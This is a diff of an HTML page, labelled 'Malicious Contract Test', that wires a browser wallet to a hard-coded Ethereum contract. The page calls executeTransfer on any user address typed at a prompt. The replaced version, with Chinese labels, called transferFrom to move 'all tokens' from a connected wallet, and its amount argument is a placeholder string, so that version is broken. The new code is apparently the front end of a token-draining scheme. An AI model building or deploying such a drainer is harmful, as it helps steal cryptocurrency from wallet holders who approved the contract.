@@ -3,167 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet and Transfer Tokens</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-        #walletButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        #addressInput, #transferButton {
-            margin-top: 20px;
-        }
-        #addressInput {
-            padding: 10px;
-            font-size: 14px;
-            width: 300px;
-        }
-        #transferButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+    <title>Malicious Contract Test</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.5.6.umd.min.js"></script>
 </head>
 <body>
-
-    <h1>连接钱包并转移所有代币</h1>
-
-    <button id="walletButton">连接钱包</button>
-    <div id="status"></div>
-
-    <input type="text" id="addressInput" placeholder="输入接收地址" disabled>
-    <button id="transferButton" disabled>转移所有代币</button>
+    <h1>Malicious Contract Test</h1>
+    <button id="connectButton">Connect Wallet</button>
+    <button id="executeTransferButton" disabled>Execute Transfer</button>
 
     <script>
-        let web3;
-        let userAccount;
-        let contractAddress = "0x8B801270f3e02eA2AACCf134333D5E5A019eFf42";  // 在这里替换为你的合约地址
-        let contractABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "owner",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			}
-		],
-		"name": "allowance",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "approve",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "sender",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transferFrom",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	}
-];  // 在这里填入你的合约ABI
+        let provider;
+        let signer;
+        let contract;
 
-        async function connectWallet() {
+        const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 您的合约地址
+        const contractABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "user",
+                        "type": "address"
+                    }
+                ],
+                "name": "executeTransfer",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "sender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transferFrom",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
+        document.getElementById("connectButton").onclick = async () => {
             if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                try {
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    userAccount = accounts[0];
-                    document.getElementById('walletButton').innerText = '连接钱包成功';
-                    document.getElementById('status').innerText = `已连接: ${userAccount}`;
-                    document.getElementById('addressInput').disabled = false;
-                    document.getElementById('transferButton').disabled = false;
-                } catch (error) {
-                    console.error('连接钱包失败', error);
-                }
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                contract = new ethers.Contract(contractAddress, contractABI, signer);
+                document.getElementById("executeTransferButton").disabled = false; // 启用按钮
             } else {
-                alert('请安装MetaMask等以太坊钱包扩展');
+                alert("Please install MetaMask!");
             }
-        }
+        };
 
-        async function transferTokens() {
-            const recipient = document.getElementById('addressInput').value;
-            if (!recipient) {
-                alert('请输入接收地址');
-                return;
-            }
-
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
+        document.getElementById("executeTransferButton").onclick = async () => {
+            const userAddress = prompt("Enter the user address to transfer from:");
             try {
-                const result = await contract.methods.transferFrom(userAccount, recipient, web3.utils.toWei('所有代币数量')).send({ from: userAccount });
-                console.log('转移成功', result);
-                alert('代币转移成功');
+                const tx = await contract.executeTransfer(userAddress);
+                await tx.wait(); // 等待交易确认
+                alert("Transfer executed successfully!");
             } catch (error) {
-                console.error('转移失败', error);
-                alert('代币转移失败');
+                console.error(error);
+                alert("Transfer failed: " + error.message);
             }
-        }
-
-        document.getElementById('walletButton').addEventListener('click', connectWallet);
-        document.getElementById('transferButton').addEventListener('click', transferTokens);
+        };
     </script>
-
 </body>
 </html>
